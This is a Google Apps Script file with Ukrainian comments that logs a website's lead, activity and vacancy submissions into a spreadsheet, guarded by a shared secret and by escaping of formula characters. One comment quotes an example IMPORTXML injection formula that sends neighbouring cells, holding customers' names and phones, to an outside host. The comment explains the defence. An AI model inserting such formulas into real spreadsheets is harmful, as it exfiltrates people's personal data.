/**
 * Код для Google Таблиці: приймає заявку від Worker'а і дописує рядок.
 *
 * Це не частина сайту — цей файл треба вставити в редактор Apps Script
 * усередині самої таблиці. Як саме — див. worker/README.md, розділ «Таблиця».
 *
 * Скрипт володіє лише колонками A–D і колонкою «Форма». Усе інше — Статус, Менеджер,
 * Коментар, блок статистики — ведеться руками, і чіпати його не можна:
 * там формули, які рахують по конкретних колонках.
 */

/** Кольори сайту, щоб шапка не виглядала чужою. */
var GREEN = '#1F3D2B'
var CREAM = '#F7F5F0'

/** Колонки, які заповнює скрипт. Порядок — як у таблиці, з A. */
var HEADERS = ['Час', "Ім'я", 'Телефон', 'Сторінка']
/** Ширини для них, у пікселях. */
var WIDTHS = [150, 190, 170, 260]

/**
 * Заголовки колонки, у яку пишемо, з якої форми прийшла заявка.
 *
 * Дві назви, бо в таблиці колонка вже зветься «Подія», а по суті там тепер
 * форма: дзвінки й відкриття вікна переїхали на окремий аркуш. Приймаємо обидві,
 * щоб перейменування було справою власника, а не умовою роботи скрипта.
 */
var EVENT_HEADERS = ['Форма', 'Подія']

/**
 * Аркуш для звернень, які не є заявками.
 *
 * Дзвінки й відкриття форми виносимо окремо, бо в таблиці заявок один рядок
 * має означати одну заявку. Інакше на одного клієнта припадало три рядки —
 * відкрив форму, заповнив, ще й натиснув номер, — і лічильник «Всього заявок»
 * рахував їх усі.
 */
var ACTIVITY_SHEET = 'Активність'
var ACTIVITY_HEADERS = ['Час', 'Подія', 'Звідки', 'Сторінка']

/**
 * Аркуш для відгуків на вакансії.
 *
 * Теж окремо, і з тієї ж причини, що й «Активність»: кандидати — це не клієнти.
 * Змішавши їх в одному списку, власник читав би вперемішку «хочу газон» і
 * «хочу працювати», а лічильник заявок рахував би одне за інше.
 */
var VACANCY_SHEET = 'Вакансії'
var VACANCY_HEADERS = ['Час', "Ім'я", 'Телефон', 'Посада', 'Коментар', 'Джерело']
var VACANCY_WIDTHS = [150, 170, 170, 200, 320, 200]

/**
 * Куди дублювати відгук листом. Кладеться руками:
 * Налаштування проєкту → Властивості скрипта → NOTIFY_EMAIL.
 *
 * Порожньо — листи просто не йдуть, і це нормальний робочий стан: основний
 * канал усе одно телеграм, лист лише підстраховує.
 */
function notifyEmail() {
  return PropertiesService.getScriptProperties().getProperty('NOTIFY_EMAIL')
}

/**
 * Мітка версії. Оновлювати при кожній зміні цього файлу.
 *
 * Потрібна, бо інакше неможливо дізнатись, який код справді відповідає за
 * адресою /exec: редактор показує один, а веб-застосунок може віддавати
 * попереднє розгортання. Відкрийте адресу в браузері — побачите цей рядок.
 */
var VERSION = 'sheet.gs 2026-08-17b · вакансії + захист від формул у клітинках'

function doGet() {
  return ContentService.createTextOutput(VERSION)
}

/**
 * Готує чуже значення до запису в клітинку.
 *
 * Таблиця вважає рядок, що починається з `=`, `+`, `-` або `@`, формулою — і
 * виконує її, щойно власник відкриє файл. Тобто будь-хто, надіславши форму,
 * може виконати код у чужій таблиці: `=IMPORTXML("https://чуже.місце/?د="&A2;"//a")`
 * тихо відправляє на свій сервер сусідні клітинки — імена й телефони тих, хто
 * до нас звертався. Це не теорія, це стандартний прийом.
 *
 * Апостроф спереду вимикає розбір: таблиця бачить текст, показує його як є, і
 * самого апострофа в клітинці не видно.
 *
 * Пропускаємо через це геть усе, що прийшло ззовні, — і відгуки, і заявки
 * клієнтів. Дати не чіпаємо, вони йдуть об'єктом Date, а не рядком.
 */
function safeCell(value) {
  if (value === null || value === undefined) return ''
  var text = String(value)
  return /^[=+\-@\t\r]/.test(text) ? "'" + text : text
}

/**
 * Спільний секрет, яким Worker доводить, що запит від нього.
 *
 * Адреса /exec мусить бути відкрита для всіх — інакше Worker до неї не
 * достукається. Тому донедавна вона й була єдиним захистом: хто її дізнався
 * (лог, скрін, переслане повідомлення), той дописував у таблицю з лідами
 * що завгодно. Тепер до адреси треба ще й знати секрет.
 *
 * Кладеться руками: Налаштування проєкту → Властивості скрипта → SHEET_SECRET.
 * Поки властивості немає, скрипт не приймає нічого: мовчазна відмова краща за
 * мовчазний дозвіл. Порядок дій — у worker/README.md.
 */
function sharedSecret() {
  return PropertiesService.getScriptProperties().getProperty('SHEET_SECRET')
}

function doPost(e) {
  // Запуск із редактора приходить без даних: людина натиснула «Виконати», не
  // помітивши, що у випадайці стоїть doPost. Замість помилки про postData
  // робимо те, заради чого туди й заходять, — наводимо лад у шапці.
  if (!e || !e.postData) return formatSheet()

  var data = JSON.parse(e.postData.contents)

  // Чужий запит. Відповідь навмисно коротка й однакова для «секрет не збігся» і
  // «секрет не заданий» — вгадувати нема за чим. Worker розрізняє її від успіху
  // за текстом: код відповіді тут завжди 200, такий у Apps Script веб-застосунок.
  var expected = sharedSecret()
  if (!expected || data.secret !== expected) {
    return ContentService.createTextOutput('forbidden')
  }

  var book = SpreadsheetApp.getActiveSpreadsheet()

  // Не заявка — на окремий аркуш, щоб тут рядок дорівнював заявці.
  if (data.kind === 'event') {
    activitySheet(book).appendRow([
      new Date(),
      safeCell(data.event),
      safeCell(data.from),
      safeCell(data.page),
    ])
    return ContentService.createTextOutput('ok')
  }

  // Відгук на вакансію — теж окремо.
  if (data.kind === 'vacancy') {
    vacancySheet(book).appendRow([
      new Date(),
      safeCell(data.name),
      safeCell(data.phone),
      safeCell(data.position),
      safeCell(data.comment),
      safeCell(data.source),
    ])
    sendVacancyEmail(data)
    return ContentService.createTextOutput('ok')
  }

  var sheet = book.getSheets()[0]
  if (sheet.getLastRow() === 0) formatSheet()

  var row = nextRow(sheet)
  sheet.getRange(row, 1, 1, 4).setValues([[
    // Саме Date, а не готовий рядок: інакше таблиця сортує час як текст і
    // «10.08» стає раніше за «09.08». Вигляд задає формат колонки.
    new Date(),
    safeCell(data.name),
    safeCell(data.phone),
    safeCell(data.page),
  ]])
  // Назву події вирішує Worker — він єдиний знає про всі канали.
  var col = eventColumn(sheet)
  if (col) sheet.getRange(row, col).setValue(safeCell(data.event) || 'Заявка')

  return ContentService.createTextOutput('ok')
}

/**
 * Шукає колонку форми за назвою в шапці.
 *
 * Саме за назвою, а не за номером: таблицю веде власник, він додає й пересуває
 * свої колонки, і зашитий номер рано чи пізно вкаже не туди. Так уже сталось —
 * колонка переїхала на G, а скрипт мовчки писав у H, поверх «Коментаря».
 *
 * Не знайшли — нічого не пишемо. Заявка важливіша за позначку, і краще лишити
 * її без виду звернення, ніж затерти чужу колонку навмання.
 */
function eventColumn(sheet) {
  var head = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0]
  for (var n = 0; n < EVENT_HEADERS.length; n++) {
    for (var i = 0; i < head.length; i++) {
      if (String(head[i]).trim() === EVENT_HEADERS[n]) return i + 1
    }
  }
  return 0
}

/**
 * Аркуш «Активність». Створює його, якщо ще немає.
 *
 * Ставимо в кінець книги навмисно: заявки пишуться в getSheets()[0], і новий
 * аркуш на першому місці мовчки перенаправив би їх не туди.
 */
function activitySheet(book) {
  var sheet = book.getSheetByName(ACTIVITY_SHEET)
  if (!sheet) {
    sheet = book.insertSheet(ACTIVITY_SHEET, book.getNumSheets())
    sheet.setFrozenRows(1)
    sheet.setColumnWidth(1, 150)
    sheet.setColumnWidth(2, 130)
    sheet.setColumnWidth(3, 150)
    sheet.setColumnWidth(4, 260)
    sheet.getRange('A2:A').setNumberFormat('dd.MM.yyyy  HH:mm')
  }

  // Шапку освіжаємо щоразу, а не лише при створенні: колонок побільшало, і
  // аркуш, зроблений раніше, лишався б із трьома — «Звідки» тоді підписано
  // як «Сторінка». Пишемо тільки свої A–D, решту веде власник.
  sheet.getRange(1, 1, 1, ACTIVITY_HEADERS.length)
    .setValues([ACTIVITY_HEADERS])
    .setFontColor(CREAM)
    .setFontWeight('bold')
    .setBackground(GREEN)
  return sheet
}

/**
 * Аркуш «Вакансії». Створює його, якщо ще немає.
 *
 * Як і «Активність», ставимо в кінець книги: заявки клієнтів пишуться в
 * getSheets()[0], і новий аркуш попереду мовчки перехопив би їх.
 */
function vacancySheet(book) {
  var sheet = book.getSheetByName(VACANCY_SHEET)
  if (!sheet) {
    sheet = book.insertSheet(VACANCY_SHEET, book.getNumSheets())
    sheet.setFrozenRows(1)
    for (var i = 0; i < VACANCY_WIDTHS.length; i++) {
      sheet.setColumnWidth(i + 1, VACANCY_WIDTHS[i])
    }
    sheet.getRange('A2:A').setNumberFormat('dd.MM.yyyy  HH:mm')
    // Телефон текстом — інакше таблиця з'їдає плюс і дужки.
    sheet.getRange('C2:C').setNumberFormat('@')
    sheet.getRange('A2:F').setVerticalAlignment('top').setWrap(true)
  }

  sheet.getRange(1, 1, 1, VACANCY_HEADERS.length)
    .setValues([VACANCY_HEADERS])
    .setFontColor(CREAM)
    .setFontWeight('bold')
    .setBackground(GREEN)
  return sheet
}

/**
 * Дублює відгук листом власнику.
 *
 * У try навмисно: рядок у таблиці на цей момент уже дописано, і виняток тут
 * означав би, що Worker вважає запис невдалим і скаржиться на втрату — при
 * тому, що заявка на місці. Лист вторинний, таблиця первинна.
 */
function sendVacancyEmail(data) {
  var to = notifyEmail()
  if (!to) return
  try {
    MailApp.sendEmail({
      to: to,
      subject: 'Відгук на вакансію: ' + (data.position || 'посада не вказана'),
      body:
        "Ім'я: " + (data.name || '—') + '\n' +
        'Телефон: ' + (data.phone || '—') + '\n' +
        'Посада: ' + (data.position || '—') + '\n' +
        'Про себе: ' + (data.comment || '—') + '\n' +
        'Звідки: ' + (data.source || '—') + '\n\n' +
        'Рядок уже в таблиці, аркуш «' + VACANCY_SHEET + '».',
    })
  } catch (err) {
    console.error('mail', err)
  }
}

/**
 * Перший вільний рядок за колонкою часу.
 *
 * getLastRow() тут не годиться: він бачить і блок статистики праворуч, який
 * тягнеться нижче за самі заявки, — і кожен запис падав би через порожнечу.
 */
function nextRow(sheet) {
  var times = sheet.getRange('A:A').getValues()
  var row = times.length
  while (row > 0 && times[row - 1][0] === '') row--
  return row + 1
}

/**
 * Наводить лад у шапці й форматах — тільки в своїх колонках.
 *
 * Запускається сама при першому записі; руками її викликають із редактора,
 * обравши formatSheet у випадайці функцій. Виконується скільки завгодно разів.
 */
function formatSheet() {
  var book = SpreadsheetApp.getActiveSpreadsheet()
  var sheet = book.getSheets()[0]

  // Щоб час у таблиці збігався з часом у телеграмі.
  book.setSpreadsheetTimeZone('Europe/Kyiv')

  sheet.getRange(1, 1, 1, HEADERS.length).setValues([HEADERS])
  sheet.setFrozenRows(1)

  for (var i = 0; i < WIDTHS.length; i++) {
    sheet.setColumnWidth(i + 1, WIDTHS[i])
  }

  // Колонку не двигаємо, якщо вона вже десь є: власник міг поставити
  // її там, де йому зручно, і формули можуть на неї посилатись.
  var col = eventColumn(sheet)
  if (!col) {
    col = sheet.getLastColumn() + 1
    sheet.getRange(1, col).setValue(EVENT_HEADERS[0])
  }
  sheet.setColumnWidth(col, 100)

  // Телефон — текстом, інакше таблиця бачить у ньому число або формулу і псує
  // «+38 (097)…».
  sheet.getRange('A2:A').setNumberFormat('dd.MM.yyyy  HH:mm')
  sheet.getRange('C2:C').setNumberFormat('@')

  // Оформлюємо тільки свої заголовки: решту шапки веде власник таблиці.
  sheet.getRange(1, 1, 1, HEADERS.length)
    .setFontColor(CREAM)
    .setFontWeight('bold')
    .setBackground(GREEN)
  sheet.getRange(1, col)
    .setFontColor(CREAM)
    .setFontWeight('bold')
    .setBackground(GREEN)

  // Довгі назви сторінок переносимо, щоб не обрізались.
  sheet.getRange('A2:D').setVerticalAlignment('top').setWrap(true)
}
